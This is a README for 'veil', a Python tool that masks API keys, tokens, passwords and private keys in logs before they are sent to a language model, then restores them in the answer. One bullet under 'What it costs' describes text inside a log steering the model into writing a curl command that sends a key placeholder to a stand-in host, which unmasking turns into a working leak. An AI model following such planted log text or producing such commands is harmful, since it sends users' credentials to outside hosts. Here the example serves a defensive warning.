# veil

**Mask the secrets in a log before a model reads it, and put them back in the answer.**

I send bot logs and configs to models for a second opinion: Codex for a stack trace, DeepSeek
for a summary. Those logs have secrets in them: a Telegram bot token inside a URL, an API key
in a retry line, a database password in a connection string. My own rule says a secret leaves
the machine only as a file, a line number and a type. I kept that rule by hand, deleting values
before I pasted, and it broke as soon as the answer needed the real value back, a corrected
config for example.

`veil mask` swaps each secret for a placeholder. `veil unmask` swaps them back in the answer.

```bash
veil mask < bot.log > masked.log          # veil: masked 4 (API_KEY 2, BOT_TOKEN 1, PASSWORD 1)
veil unmask < answer.txt > answer.real.txt
your-model-cli < masked.log | veil unmask   # a streamed answer stays streamed
```

```
09:12:03 POST https://api.telegram.org/bot{{BOT_TOKEN_3b396131}}/sendMessage -> 429, retry in 3s
09:12:04 llm: DEEPSEEK_API_KEY={{API_KEY_276082b2}} model=deepseek-chat max_tokens=4096
09:12:04 llm: 401 Unauthorized for key {{API_KEY_276082b2}}
09:12:05 db: connect postgres://bot:{{PASSWORD_8781fa22}}@127.0.0.1:5432/trades failed
```

Python 3.9+ on macOS or Linux, standard library only, one file. Copy `veil.py` onto your
`PATH` as `veil`, or run `python3 veil.py mask`.

## How it works

- A placeholder is the kind of secret plus the first 8 hex digits of an HMAC-SHA256 of the
  value, keyed with 32 random bytes made on first use. The same value gets the same placeholder
  in every run, so the model can see that line 3 failed with the key from line 2. Without the
  key the placeholder tells you nothing about the value, and you cannot check a guess against it.
- Placeholder and value pairs go to `~/.config/veil/map.json` (or `$VEIL_HOME`, or `--home`),
  mode 600 in a 700 directory, written atomically under a file lock, so two runs at once do not
  lose each other's values. No command prints them.
- A value masked once is masked wherever it shows up again, in the same text or a later one, if
  it looks random enough: three of lower case, upper case, digits and symbols, or 16 or more
  characters with letters and digits. Line 2 above has the key under a name, line 3 has it bare.
- `unmask` also restores a placeholder the model wrote back differently: with spaces inside the
  braces, without braces, in lower case, with one brace missing. A placeholder it does not know
  stays as it is.
- `unmask` writes its input out as it arrives and holds back only a tail that could still turn
  into a placeholder, about one word.
- Text that already holds placeholders, a masked log with new lines added or an answer pasted
  back, is masked around them. In `password: Zq81 horse {{API_KEY_276082b2}}` or
  `"token": "{{API_KEY_276082b2}}-Zq81xk"` the value is judged as it read before the earlier
  mask, and the text on either side of the placeholder is masked; the placeholder stays.
- `mask` and then `unmask` give back the input byte for byte, CRLF line ends and invalid UTF-8
  included.

## What counts as a secret

| kind | what |
|---|---|
| `PRIVATE_KEY` | PEM private key blocks: RSA, EC, OpenSSH, encrypted, PGP. A block cut off before its END line is masked to the end of the text, or up to the next `-----BEGIN` or a placeholder already there. A block whose top was cut off (`tail -n 200`) is masked from the first of its lines left (base64, or a header like `DEK-Info:`) through END; the lines above stay. Public keys and certificates are not masked |
| `API_KEY` | `sk-…` (OpenAI, Anthropic, DeepSeek, OpenRouter), Google `AIza…`, Groq `gsk_…`, Stripe `sk_live_…`, Hugging Face, xAI, npm, PyPI, DigitalOcean, SendGrid |
| `GIT_TOKEN` | GitHub `ghp_…`, `gho_…`, `github_pat_…`; GitLab `glpat-…` |
| `SLACK_TOKEN`, `AWS_KEY_ID`, `JWT` | `xox…`; `AKIA…`, `ASIA…`; `eyJ….eyJ….…` |
| `BOT_TOKEN` | Telegram bot tokens, also inside `api.telegram.org/bot…` URLs |
| `HEX_KEY` | any 64-digit hex string, with or without `0x`, the shape of an Ethereum private key |
| `PASSWORD` | the password in `scheme://user:password@host`, also with no user (`redis://:password@host`) |
| `TOKEN` | what follows `Bearer` or `Basic` |
| `SECRET` | a value under a name that says secret: `DB_PASSWORD=…`, `"client_secret": "…"`, `apiKey: …`, `--token …`, `?api_key=…`, `Authorization:`, `Cookie:` |

A name says secret when it contains password, passwd, passphrase, secret, token, api_key,
access_key, private_key, credential, mnemonic or authorization, or ends in `_pass` or `_pwd`.
`apiKey`, `api-key` and `API_KEY` read the same. Some names only might hold a secret: `key`,
anything ending in `_key`, `_pk`, `_auth` or `_dsn`, and names with cookie or webhook in them.
Code calls a lot of things a key, so under these names only a value with letters and digits
counts. Names about a secret (`token_type`, `key_path`, `secret_name`, `*_id`, `*_count` and a
few more) are skipped. So are values that stand in for a secret: `${TOKEN}`,
`os.environ[...]`, `getpass()`, `None`, `****`, numbers, dates and `module.attribute` chains.
At the start of a line in YAML or header style (`password: …`) the value runs to the end of the
line. Elsewhere it is one word or one quoted string.

## What the measurements changed

I ran `mask` over the CPython 3.14 standard library: 2,095 files, 39.6 MB of code, tests and
test certificates. Code is the hard case for the name rule, since it is full of variables called
`token` and arguments called `key`.

- The first version replaced 1,777 values as `SECRET` in 150 files. Most were `sorted(key=…)`
  arguments and ordinary words that got masked once under a secret name and then spread: after
  one `key=filename`, `filename` was masked inside `user_filename` all over the file. Now a value
  spreads only if it looks random, by the rule above, and the "might" names need letters and
  digits.
- Now it makes 144 `SECRET` replacements in 58 files. 65 of the 143 lines are test passwords,
  cookies and `Authorization` headers, things that sit where a secret would. The other 78 are
  code, like a parser's `self.token = nextchar` or the error message `pwd: expected bytes`. They
  make the masked text harder to read, and `unmask` puts them back.
- It caught all 15 files that hold a private key, 17 keys in total.
- All 44 `HEX_KEY` replacements are SHA-256 test vectors and digests. A hash and a key look the
  same.

I have not measured it on a corpus of real logs. The tests use synthetic secrets only.

## What it does not catch

- **A secret with no telling name and no known format.** `RPC_URL=https://mainnet.example/v3/<key>`
  carries a key in the path under a name that says URL. A password in a sentence without
  `password:` in front of it gets through the same way.
- **Formats it has no rule for.** Solana keys (base58 or a byte array), a seed phrase outside a
  `mnemonic` field, a base64 blob under a neutral name, keys from a provider that gives them no
  prefix.
- **Short and numeric values.** Under a name, a value shorter than 6 characters or made of
  digits only is left alone, a PIN included. Next to a placeholder already in the text, a part
  of one or two characters stays.
- **A value with spaces in the middle of a line.** In `retry password=correct horse battery`
  only `correct` is masked.
- **A key cut at the top in a log that prefixes every line.** journald and `docker logs -t` put
  a timestamp before each line of the key. Without its BEGIN line, only lines that hold nothing
  but the key count as the key, so such a key passes through.
- **Personal data.** Emails, phone numbers and names pass through. magpie has rules for those,
  this tool does not.
- **A placeholder the model rewrites beyond the forms above.** If it cuts one short or renames
  it, it stays in the output as a placeholder.

What it costs:

- **Every 64-digit hex string gets masked,** transaction hashes and checksums included. The same
  hash still gets the same placeholder, so the model can follow it through a log.
- **A one-word line right above a key cut at the top goes with it.** A word like `ready` is
  made of the same letters as a line of base64, so it ends up in the key's placeholder.
- **The map keeps every masked value in plain text** (mode 600). Whoever can read your home
  directory can read it, the same as your `.env`. Delete `map.json` once a conversation is over;
  the key can stay.
- **`unmask` puts a secret back wherever the model wrote its placeholder.** If text inside the
  log talks the model into writing `curl https://x.example/?k={{API_KEY_276082b2}}`, the unmasked
  answer holds a working command with your key in it. Read an unmasked answer before you run
  anything from it.

## From Python

```python
from pathlib import Path
from veil import Store, Unmasker, locked, mask_text

home = Path.home() / ".config" / "veil"
with locked(home):
    store = Store(home)
    masked, counts = mask_text(log_text, store)
    store.save()

um = Unmasker(store.values)
for chunk in model_stream:
    print(um.feed(chunk), end="")
print(um.flush())
```

## Tests

```bash
python3 tests/test_veil.py
```

158 checks: each token format on a synthetic value, private keys cut off at the end and at the
top, secrets next to a placeholder an earlier mask left (and a mask of that text again), the
name rule on 16 lines it must mask and 21 it must leave alone (from `max_tokens=4096`
to `sorted(key=lambda …)`), the same placeholder across runs and a different one under another
key, a forced hash collision, an exact round trip through the CLI with CRLF and invalid UTF-8,
the forms of a mangled placeholder, a streamed reply cut at every position and at 300 random
sets of positions, file modes, a corrupt map, and eight masks running at once. Every
token-shaped secret is assembled at run time from a seeded generator, and gitleaks finds nothing
in the file. To check that the tests catch what they claim to, I broke the code in 24 places,
one at a time (no stream hold-back, no file lock, no collision handling and so on), and each
break failed at least one check. The cut-key rules got eight more such breaks and the masking
around placeholders eleven, all caught.

## Where it came from

The idea and most of the token patterns come from
[yetone/magpie](https://github.com/yetone/magpie), `internal/redact/redact.go` (MIT): the keyed
HMAC placeholders, the regexes, putting back a placeholder the model mangled, and holding back
the end of a stream chunk. magpie is a local gateway that masks every request a coding agent
sends to a model provider. This is just the masking, as a pipe you run by hand, with the map
kept on disk so that tomorrow's reply still unmasks. The split into strong and weak names, the
names about a secret, the spreading threshold and the stream cut are mine, from the
measurements above.

## License

MIT. The ported parts keep magpie's MIT notice in [NOTICE](NOTICE).
